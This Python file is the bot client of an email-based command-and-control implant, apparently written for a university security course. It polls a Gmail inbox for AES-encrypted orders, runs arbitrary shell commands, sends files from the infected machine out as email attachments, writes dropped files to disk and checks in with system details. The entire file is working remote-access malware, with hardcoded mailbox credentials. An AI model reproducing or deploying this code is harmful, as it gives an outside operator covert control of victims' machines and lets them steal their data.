import subprocess
import sys
import os
import platform
import base64
import threading
import random
import string
import imaplib
import email
import uuid
import json
import smtplib
import time

from tzlocal import get_localzone
from datetime import datetime
from base64 import b64decode
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2

gmail_email = 'cse363c2project@gmail.com'
gmail_password = 'cse363c2'
s = "smtp.gmail.com"
s_port = 587
AESKey = 'cse363'
salt = b'363'

uniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))

class Cipher:

	def __init__(self):
		self.key = PBKDF2(AESKey, salt, dkLen=32)

	def Encrypt(self, plainText):
		aes = AES.new(self.key, AES.MODE_CBC)
		ciphered_data = aes.iv + aes.encrypt(pad(plainText.encode(),AES.block_size))
		return base64.b64encode(ciphered_data)

	def Decrypt(self, cipherText):
		data = base64.b64decode(cipherText[2:-1].encode())
		iv = data[:AES.block_size]
		ciphered_data = data[AES.block_size:]
		aes = AES.new(self.key,AES.MODE_CBC,iv)
		return unpad(aes.decrypt(ciphered_data),AES.block_size)

ciph = Cipher()

class EmailParser:

	def __init__(self, email_data):
		self.attachment = None
		self.getPayloads(email_data)
		self.getSubjectHeader(email_data)
		self.getDateHeader(email_data)

	def getPayloads(self, email_data):
		for payload in email.message_from_string(email_data[1][0][1].decode()).get_payload():
			if payload.get_content_maintype() == 'text':
				self.text = payload.get_payload()
				self.dict = json.loads(ciph.Decrypt(payload.get_payload()).decode())

			elif payload.get_content_maintype() == 'application':
				self.attachment = payload.get_payload()

	def getSubjectHeader(self, email_data):
		self.subject = email.message_from_string(email_data[1][0][1].decode())['Subject']

	def getDateHeader(self, email_data):
		self.date = email.message_from_string(email_data[1][0][1].decode())['Date']

class downloadFromClient(threading.Thread):

	def __init__(self, jobid, filepath):
		threading.Thread.__init__(self)
		self.jobid = jobid
		self.filepath = filepath

		self.daemon = True
		self.start()

	def run(self):
		try:
			if os.path.exists(self.filepath) is True:
				sendEmail({'cmd': 'dlfc', 'response': 'Successful download'}, self.jobid, [self.filepath])
			else:
				sendEmail({'cmd': 'dlfc', 'response': 'Filepath does not exist'}, self.jobid)
		except Exception as e:
			sendEmail({'cmd': 'dlfc', 'response': 'Failed: '.format(e)}, self.jobid)

class uploadToClient(threading.Thread):

	def __init__(self, jobid, filepath, attachment):
		threading.Thread.__init__(self)
		self.jobid = jobid
		self.filepath = filepath
		self.attachment = attachment

		self.daemon = True
		self.start()

	def run(self):
		try:
			with open(self.filepath, 'wb') as ufile:
				ufile.write(b64decode(self.attachment))
			sendEmail({'cmd': 'uptc', 'response': 'Successful upload'}, self.jobid)
		except Exception as e:
			sendEmail({'cmd': 'uptc', 'response': 'Failed: '.format(e)}, self.jobid)

class executeCommand(threading.Thread):

	def __init__(self, command, jobid):
		threading.Thread.__init__(self)
		self.command = command
		self.jobid = jobid

		self.daemon = True
		self.start()

	def run(self):
		try:
			proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read()
			stdout_value += proc.stderr.read()

			sendEmail({'cmd': self.command, 'response': stdout_value.decode()}, jobid=self.jobid)
		except Exception as e:
			pass

def getSystemInfo():
	return '{}-{}'.format(platform.platform(), platform.machine())

def getTimeZone():
	return str(get_localzone())

class sendEmail(threading.Thread):

	def __init__(self, output, jobid='', attachment=[], checkin=False):
		threading.Thread.__init__(self)
		self.output = output
		self.jobid = jobid
		self.attachment = attachment
		self.checkin = checkin

		self.daemon = True
		self.start()

	def run(self):
		header = uniqueid

		if self.jobid:
			header = 'client:{}:{}'.format(uniqueid, self.jobid)
		elif self.checkin:
			header = 'checkin:{}'.format(uniqueid)
			self.output = str(datetime.now())

		msg = MIMEMultipart()
		msg['From'] = header
		msg['To'] = gmail_email
		msg['Subject'] = header
		msgbody = ciph.Encrypt(json.dumps({'sysinfo': getSystemInfo(), 'timezone': getTimeZone(), 'output': self.output}))
		msg.attach(MIMEText(str(msgbody)))

		for file in self.attachment:
			if os.path.exists(file) == True:
				part = MIMEBase('application', 'octet-stream')
				part.set_payload(open(file, 'rb').read())
				encoders.encode_base64(part)
				part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(file)))
				msg.attach(part)

		while True:
			try:
				mailServer = smtplib.SMTP(host=s, port=s_port)
				mailServer.starttls()
				mailServer.login(gmail_email,gmail_password)
				mailServer.sendmail(gmail_email, gmail_email, msg.as_string())
				mailServer.quit()

				break
			except Exception as e:
				time.sleep(10)

def checkInbox():

	#counters to send checkin emails at a set interval to show which bots are still active
	counter=0
	checkin_timer=11
	checkin_count=0

	while True:

		try:
			if counter >= checkin_timer:
				checkin_count+=1
				sendEmail("Timed check in {}".format(checkin_count), checkin=True)
				counter=0

			c = imaplib.IMAP4_SSL(s)
			c.login(gmail_email, gmail_password)
			c.select("INBOX")

			typ, data = c.search(None, "(UNSEEN SUBJECT 'server:{}')".format(uniqueid))

			for ids in data[0].split():
				msg_data = c.fetch(ids, '(RFC822)')
				msg = EmailParser(msg_data)
				jobid = msg.subject.split(':')[2]

				if msg.dict:
					command = msg.dict['cmd']
					arg = msg.dict['arg']

					if command == 'cmd':
						executeCommand(arg, jobid)

					elif command == 'dlfc':
						downloadFromClient(jobid, arg)

					elif command == 'uptc':
						uploadToClient(jobid, arg, msg.attachment)

			c.logout()
			counter+=1
			time.sleep(10)
		except Exception as e:
			counter+=1
			time.sleep(10)

if __name__ == '__main__':
	sendEmail("Bot acquired.", checkin=True)
	try:
		checkInbox()
	except KeyboardInterrupt:
		pass